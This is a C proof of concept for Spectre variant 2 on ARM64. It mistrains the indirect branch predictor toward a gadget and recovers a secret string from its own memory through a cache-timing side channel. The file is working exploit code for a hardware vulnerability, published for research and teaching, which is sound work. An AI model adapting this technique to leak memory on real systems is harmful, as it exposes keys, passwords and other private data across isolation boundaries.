/*
 * Spectre Variant 2 Proof of Concept.
 *
 * The program uses spectre v2 to read its own memory.
 * See the paper for details: https://spectreattack.com/spectre.pdf.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>

volatile uint64_t counter = 0;
uint64_t miss_min = 0;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t channel[256 * 512]; // side channel to extract secret phrase
char *secret = "The Magic Words are Squeamish Ossifrage.";

uint64_t *target; // pointer to indirect call target

void *inc_counter(void *a)
{
    while (1)
    {
        counter++;
        asm volatile("DMB SY");
    }
}

// timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
static uint64_t timed_read(volatile uint8_t *addr)
{
    uint64_t ns = counter;

    /*
     * Reference: http://www.ethernut.de/en/documents/arm-inline-asm.html
     */
    asm volatile(
        "DSB SY\n"
        "LDR X5, [%[ad]]\n"
        "DSB SY\n"
        :
        : [ad] "r"(addr)
        : "x5");

    return counter - ns;
}

static inline void flush(void *addr)
{
    asm volatile("DC CIVAC, %[ad]"
                 :
                 : [ad] "r"(addr));
    asm volatile("DSB SY");
}

uint64_t measure_latency()
{
    uint64_t ns;
    uint64_t min = 0xFFFFF;

    for (int r = 0; r < 300; r++)
    {
        flush(&array1[0]);
        ns = timed_read(&array1[0]);
        if (ns < min)
            min = ns;
    }

    return min;
}

// mistrained target of indirect call
int gadget(char *addr)
{
    return channel[*addr * 512]; // speculative loads fetch data into the cache
}

// safe target of indirect call
int safe_target()
{
    return 42;
}

// function that makes indirect call
int victim(char *addr, int input)
{
    int junk = 0;
    int result;

    // addr will be passed as the 1st argument
    asm volatile("mov x19, x30\n");
    // x3 = *target
    asm volatile("mov x3, %[f]" ::[f] "r"(*target));
    // Prepare the first argument
    asm volatile("mov x0, %[src]\n" ::[src] "r"(addr)
                 :);
    // Jump to register x3
    // A branch misprediction occurs at this point. Register x3 is trained using
    // a malicious 'gadget'. Although x3 is a safe target during actual execution,
    // a speculative function call to 'gadget' is made.
    asm volatile("blr x3\n");

    // Store the return value in `result`
    asm volatile("mov %[res], x0"
                 : [res] "=r"(result)::);
    // Restore the return address
    asm volatile("mov x30, x19\n");

    return result & junk;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
// int victim(char *addr, int input)
// {
//     int junk = 0;
//     // set up branch history buffer (bhb) by performing >29 taken branches
//     // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
//     //   for details about how the branch prediction mechanism works
//     // junk and input used to guarantee the loop is actually run
//     // for (int i = 1; i <= 100; i++)
//     // {
//     //     input += i;
//     //     junk += input & i;
//     // }

//     int result;
//     // call *target
//     // asm volatile("BL %[tgt]\n"
//     //              "MOV X8, %[res]\n"
//     //              : [res] "=r"(result)
//     //              : [tgt] "r"(target)
//     //              :);

//     // addr will be passed as the 1st argument
//     asm volatile("mov x19, x30\n");
//     asm volatile("mov x3, %[f]" ::[f] "r"(*target));
//     // asm volatile("blr %[tgt]\n"
//     //              :
//     //              : [tgt] "r"(*target)
//     //              : "x1", "x19");

//     // Prepare the first argument
//     asm volatile("mov x0, %[src]\n" ::[src] "r"(addr)
//                  :);

//     asm volatile("blr x3\n");
//     asm volatile("mov %[res], x0"
//                  : [res] "=r"(result)::);
//     asm volatile("mov x30, x19\n");
//     // printf("h113\n");

//     return result & junk;
// }

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read, uint8_t value[2], int score[2])
{
    int results[256]; // record number of cache hits
    int tries, i, j, k, mix_i;
    uint8_t *addr;
    register uint64_t elapsed;
    char dummyChar = '$';
    // char dummyChar = 0;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        /* Flush channel[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            flush(&channel[i * 512]); /* intrinsic for clflush instruction */

        // /*
        // poison branch target predictor
        *target = (uint64_t)&gadget;
        for (j = 50; j > 0; j--)
        {
            victim(&dummyChar, 0);
        }

        // change to safe target
        *target = (uint64_t)&safe_target;

        // flush target to prolong misprediction interval
        flush((void *)target);
        for (volatile int z = 0; z < 100; z++)
        {
        } /* Delay (can also mfence) */

        // */

        victim(addr_to_read, 0);

        // call victim
        // junk ^= victim(addr_to_read, 0);
        // gadget(addr_to_read);
        // gadget(addr_to_read);
        // gadget(addr_to_read);
        // gadget(addr_to_read);

        // now, the value of *addr_to_read should be cached even though
        // the logical execution path never calls gadget()

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            elapsed = timed_read(&channel[mix_i * 512]);

            if (elapsed <= miss_min && mix_i != dummyChar && mix_i != 0x00)
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (j == 0)
            continue;

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, char *argv[])
{
    printf("Putting '%s' in memory\n", secret);

    for (size_t i = 0; i < sizeof(channel); i++)
        channel[i] = 1; /* write to channel so in RAM not copy-on-write zero pages */

    // Initialize counter
    pthread_t inc_counter_thread;
    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL))
    {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }
    // let the bullets fly a bit ....
    while (counter < 10000000)
        ;

    asm volatile("DSB SY");

    miss_min = measure_latency();
    // if (miss_min == 0)
    // {
    //     fprintf(stderr, "Unreliable access timing\n");
    //     exit(EXIT_FAILURE);
    // }
    miss_min -= 1;
    printf("miss_min %d\n", (int)miss_min);

    target = (uint64_t *)malloc(sizeof(uint64_t));

    uint8_t value[2];
    int score[2];
    int len = strlen(secret);
    char *addr = secret;

    // if (argc == 3)
    // {
    //     sscanf(argv[1], "%p", (void **)(&addr));
    //     sscanf(argv[2], "%d", &len);
    // }

    printf("Reading %d bytes starting at %p:\n", len, addr);
    while (--len >= 0)
    {
        printf("reading %p...\n", addr);
        readByte(addr++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    printf("\n");

    // free(target);
    return 0;
}